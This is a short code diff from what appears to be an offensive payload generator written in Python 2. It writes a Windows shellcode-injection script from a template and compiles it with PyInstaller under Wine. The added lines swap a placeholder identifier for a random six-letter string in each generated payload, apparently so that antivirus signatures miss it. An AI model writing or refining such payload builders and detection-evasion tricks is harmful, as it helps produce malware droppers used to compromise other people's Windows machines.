@@ -57,7 +57,8 @@ def askAndReturnModules(shellcode, metasploit_type):
 
 def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-        Filesave.write(SHELLCODE.injectwindows % (ez2read_shellcode))
+        randomctypes = ''.join(random.sample(string.ascii_lowercase, 6))
+        Filesave.write(SHELLCODE.injectwindows.replace('changeme',randomctypes) % (ez2read_shellcode))
         Filesave.close()
     print '[*] Creating Payload using Pyinstaller...'
     p = subprocess.Popen(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
